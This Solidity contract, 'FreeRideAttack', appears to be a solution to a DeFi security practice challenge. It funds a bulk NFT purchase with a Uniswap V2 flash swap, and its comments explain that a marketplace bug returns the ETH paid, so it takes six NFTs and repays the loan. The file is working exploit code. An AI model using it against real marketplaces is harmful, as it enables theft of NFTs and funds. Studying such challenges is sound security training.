// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
interface IWETH9{
    function withdraw(uint wad) external;
    function deposit() external payable;
}
interface IUniswapV2Factory{
    function getPair(address token1,address token2) external returns(address);
}

interface IUniswapV2Pair{
    function token0() external returns(address);
    function token1() external returns(address);
    function swap(uint amount0,uint amount1,address to,bytes memory data) external;
}

interface INFTMarketplace{
    function buyMany(uint256[] calldata tokenIds) external payable;
}
contract FreeRideAttack is ReentrancyGuard{

    address weth;
    address factory;
    address marketplace;
    address buyer;
    uint[] tokenIds = [0,1,2,3,4,5];
    constructor(address _weth,address _factory,address _marketplace,address _buyer){
        weth = _weth;
        factory = _factory;
        marketplace = _marketplace;
        buyer = _buyer;
    }

    function useFlashSwap(address _token,uint amount,address nft) external payable{
        address pair = IUniswapV2Factory(factory).getPair(_token,weth);
        require(pair!=address(0));

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        uint amount0Out = token0 == weth ? amount:0;
        uint amount1Out = token1 == weth ? amount:0;
        
        bytes memory data = abi.encode(nft,amount);
        IUniswapV2Pair(pair).swap(amount0Out,amount1Out,address(this),data);

    }

    function uniswapV2Call(address sender,uint ,uint , bytes calldata data) external{
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(factory).getPair(token0,token1);
        require(pair==msg.sender);
        require(sender == address(this));
        (address nft, uint amount) = abi.decode(data,(address,uint));

        uint fee = ((amount*3)/997)+1;
        uint amountToRepay = amount + fee;
        
        IWETH9(weth).withdraw(amount);
        INFTMarketplace(marketplace).buyMany{value:15 ether}(tokenIds);

        for(uint i=0;i<6;i++){
            IERC721(nft).safeTransferFrom(address(this), buyer, i);
        }
        IWETH9(weth).deposit{value: 15.1 ether}();
        IERC20(weth).transfer(pair, amountToRepay);
    }

    function onERC721Received(
        address,
        address,
        uint256 ,
        bytes memory
    ) 
        external
        nonReentrant
        returns (bytes4) 
    {

        return IERC721Receiver.onERC721Received.selector;
    }
    receive() external payable{}
}

//Borrow 15 Weth from uniswap
//Convert weth to eth
//Buy All NFT's
//You get back all the eth because of a bug in the code
//Convert eth back to weth
//Send back weth to uniswap